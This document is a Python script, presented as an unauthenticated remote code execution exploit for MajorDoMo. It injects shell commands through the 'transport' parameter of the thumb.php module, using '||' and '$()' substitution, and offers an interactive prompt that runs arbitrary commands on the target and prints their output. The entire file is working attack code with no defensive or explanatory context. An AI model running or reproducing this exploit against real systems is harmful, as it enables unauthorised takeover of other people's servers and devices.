import re, requests, argparse

def inject_command(base_url, command):
    target_url = f"{base_url}/modules/thumb/thumb.php"
    
    params = {
        "url": "cnRzcDovL2EK",
        "debug": "1",
        "transport": f"||echo; echo -n '['; echo 'S]'; echo $({command}); echo '[E]'#;"
    }

    response = requests.get(target_url, params=params)
    
    match = re.search(r'\[S\](.*?)\[E\]', response.text, re.DOTALL)
    if match:
        return match.group(1).strip()

    return "No output detected."

def main():
    parser = argparse.ArgumentParser(description="MajorDoMo Unauthenticated Remote Code Execution.")
    parser.add_argument("base_url", help="Base URL (e.g., http://localhost)")
    args = parser.parse_args()

    while True:
        command = input("Enter the command to inject (or 'exit' to quit): ")
        if command.lower() == 'exit':
            break

        result = inject_command(args.base_url, command)
        print("Result:")
        print("----------")
        print(result)
        print("----------\n")

if __name__ == "__main__":
    main()
